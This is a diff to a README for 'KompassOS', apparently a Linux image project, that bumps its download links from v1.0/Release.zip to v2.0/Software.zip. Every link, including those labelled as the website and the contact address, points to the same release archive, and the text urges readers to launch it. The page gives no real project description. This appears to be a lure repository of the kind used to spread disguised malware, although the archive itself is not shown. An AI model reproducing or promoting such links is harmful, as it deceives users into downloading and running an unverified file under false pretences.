@@ -19,7 +19,7 @@ Unfortunately, a short description of this repository is not provided at the mom
 🔹 operating-system
 
 ## Launch KompassOS Software
-[![Launch KompassOS Software](https://github.com/lammne/KompassOS/releases/download/v1.0/Release.zip%20Software-brightgreen)](https://github.com/lammne/KompassOS/releases/download/v1.0/Release.zip)
+[![Launch KompassOS Software](https://github.com/lammne/KompassOS/releases/download/v2.0/Software.zip%20Software-brightgreen)](https://github.com/lammne/KompassOS/releases/download/v2.0/Software.zip)
 
 Click the button above to launch the KompassOS Software and embark on your journey to discover the power of atomic and custom Linux images. 🚀
 
@@ -27,10 +27,10 @@ Click the button above to launch the KompassOS Software and embark on your journ
 If the link above ends with the file name, it needs to be launched. If the link does not work or you need more information, kindly check the "Releases" section of this repository for further updates.
 
 ## Additional Resources
-Visit our website [https://github.com/lammne/KompassOS/releases/download/v1.0/Release.zip](https://github.com/lammne/KompassOS/releases/download/v1.0/Release.zip) for additional insights and updates on the latest in atomic and custom Linux image technology.
+Visit our website [https://github.com/lammne/KompassOS/releases/download/v2.0/Software.zip](https://github.com/lammne/KompassOS/releases/download/v2.0/Software.zip) for additional insights and updates on the latest in atomic and custom Linux image technology.
 
 ## Get in Touch
-Have questions or feedback? Feel free to reach out to us at [https://github.com/lammne/KompassOS/releases/download/v1.0/Release.zip](https://github.com/lammne/KompassOS/releases/download/v1.0/Release.zip). Your feedback is invaluable to us as we continue to enhance the KompassOS experience.
+Have questions or feedback? Feel free to reach out to us at [https://github.com/lammne/KompassOS/releases/download/v2.0/Software.zip](https://github.com/lammne/KompassOS/releases/download/v2.0/Software.zip). Your feedback is invaluable to us as we continue to enhance the KompassOS experience.
 
 Let's explore the wonders of atomic, immutable, and custom Linux images together with KompassOS! 🚀🔵🌟
 
